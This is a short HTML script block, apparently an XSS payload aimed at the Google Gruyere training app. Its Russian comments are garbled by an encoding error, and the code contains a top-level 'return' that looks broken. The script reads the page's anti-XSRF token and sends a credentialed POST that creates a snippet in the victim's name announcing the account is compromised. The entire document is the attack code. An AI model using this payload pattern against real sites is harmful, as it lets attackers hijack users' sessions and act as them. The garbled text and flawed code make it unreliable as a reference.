<script>
// 1. –ü–æ–ª—É—á–∞–µ–º XSRF-—Ç–æ–∫–µ–Ω –∏–∑ —Ñ–æ—Ä–º—ã –∏–ª–∏ –∫—É–∫
const tokenMatch = document.body.innerHTML.match(/name="xsrf" value="([^"]+)"/);
const xsrfToken = tokenMatch ? tokenMatch[1] : '';

if (!xsrfToken) {
  console.log('–¢–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω ‚Äî –≤–æ–∑–º–æ–∂–Ω–æ, –Ω–µ –∑–∞–ª–æ–≥–∏–Ω–µ–Ω');
  return;
}

// 2. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º POST-–∑–∞–ø—Ä–æ—Å –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ —Å–Ω–∏–ø–ø–µ—Ç–∞
fetch('https://google-gruyere.appspot.com/643453999600290416051506802884356354571/newsnippet', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: `snippet=üí•%20–í–∞—à%20–∞–∫–∫–∞—É–Ω—Ç%20—Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω%20XSRF%20+%20XSS%20–∞—Ç–∞–∫–∞&xsrf=${xsrfToken}`
})
.then(() => console.log('–ù–æ–≤—ã–π —Å–Ω–∏–ø–ø–µ—Ç —Å–æ–∑–¥–∞–Ω'))
.catch(err => console.error('–û—à–∏–±–∫–∞:', err));
</script>
